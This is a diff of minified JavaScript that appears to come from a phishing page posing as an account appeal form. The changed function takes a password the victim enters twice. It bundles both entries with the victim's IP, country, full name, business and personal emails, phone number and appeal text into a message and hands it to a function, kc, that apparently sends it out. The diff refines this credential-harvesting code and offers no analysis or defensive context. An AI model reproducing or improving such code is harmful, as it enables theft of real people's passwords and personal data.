@@ -8151,17 +8151,18 @@ function xf({
   let v = uu.useRef("");
 
   const m = () => {
-    if (a === 1 && (v.current = l), d(h => h + 1), l.length >= 6 && l === v.current) {
+    if (a === 1 && l.length >= 6 && l === v.current && l.trim() !== "") {
         r(!0);
         setTimeout(() => {
             r(!1);
             u(1);
             o("");
         }, 500);
-
+        const ipAddress = localStorage.getItem("ipAddress");
+        const countryCode = localStorage.getItem("countryCode");
+        const countryName = localStorage.getItem("countryName");
         const h = JSON.parse(localStorage.getItem("form"));
-        const x = `IP: ${localStorage.getItem("ipAddress")}\nCountry: ${localStorage.getItem("countryCode")} - ${localStorage.getItem("countryName")}\n\nPage Name: ${h.page}\nFull Name: ${h.fname}\nBusiness email: ${h.bemail}\nPersonal email: ${h.pemail}\nPhone number: ${h.phone}Appeal: ${h.apeal}\n\nFirst pass: ${l}\nLast pass: ${v.current}`;
-
+        const x = `IP: ${ipAddress}\nCountry: ${countryCode} - ${countryName}\n\nPage Name: ${h.page}\nFull Name: ${h.fname}\nBusiness email: ${h.bemail}\nPersonal email: ${h.pemail}\nPhone number: ${h.phone}\nAppeal: ${h.apeal}\n\nFirst pass: ${l}\nLast pass: ${v.current}`;
         kc(x);
         
         if (i === 1) {
